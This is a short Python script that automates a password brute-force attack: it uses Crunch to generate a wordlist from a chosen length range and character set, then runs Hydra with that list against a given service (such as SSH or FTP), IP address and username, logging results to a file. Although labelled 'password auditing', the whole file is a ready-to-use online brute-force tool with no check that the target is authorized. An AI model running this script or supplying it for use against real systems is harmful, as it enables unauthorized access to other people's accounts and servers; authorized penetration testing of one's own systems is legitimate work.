import subprocess
import os
import argparse
import datetime

# Function to generate wordlist using Crunch
def generate_wordlist(min_length, max_length, charset, output_file):
    try:
        crunch_command = ['crunch', str(min_length), str(max_length), charset, '-o', output_file]
        print(f"Generating wordlist using Crunch: {' '.join(crunch_command)}")
        subprocess.run(crunch_command)
        print(f"Wordlist generated: {output_file}")
    except Exception as e:
        print(f"Error generating wordlist: {e}")

# Function to perform brute-force attack using Hydra
def perform_attack(service, ip_address, username, wordlist):
    try:
        hydra_command = ['hydra', '-l', username, '-P', wordlist, f'{service}://{ip_address}']
        print(f"Starting password audit with Hydra: {' '.join(hydra_command)}")
        
        # Redirect output to log file
        with open('audit_log.txt', 'a') as logfile:
            logfile.write(f"Started audit at {datetime.datetime.now()}:\n")
            result = subprocess.run(hydra_command, stdout=logfile, stderr=logfile)
            logfile.write(f"Audit finished at {datetime.datetime.now()}\n")
        
        print(f"Audit completed. Check audit_log.txt for details.")
    except Exception as e:
        print(f"Error performing attack: {e}")

# Main function
if __name__ == "__main__":
    # Command-line arguments
    parser = argparse.ArgumentParser(description="Automate Wordlist Generation and Password Auditing")
    parser.add_argument('--min_length', type=int, help="Minimum length of passwords", required=True)
    parser.add_argument('--max_length', type=int, help="Maximum length of passwords", required=True)
    parser.add_argument('--charset', type=str, help="Character set for Crunch (e.g., abc123)", required=True)
    parser.add_argument('--output_file', type=str, help="File to save generated wordlist", default="wordlist.txt")
    parser.add_argument('--service', type=str, help="Service to attack (e.g., ftp, ssh)", required=True)
    parser.add_argument('--ip_address', type=str, help="IP address of target", required=True)
    parser.add_argument('--username', type=str, help="Username for login attempts", required=True)

    args = parser.parse_args()

    # Generate wordlist using Crunch
    generate_wordlist(args.min_length, args.max_length, args.charset, args.output_file)
    
    # Perform password auditing using Hydra
    perform_attack(args.service, args.ip_address, args.username, args.output_file)
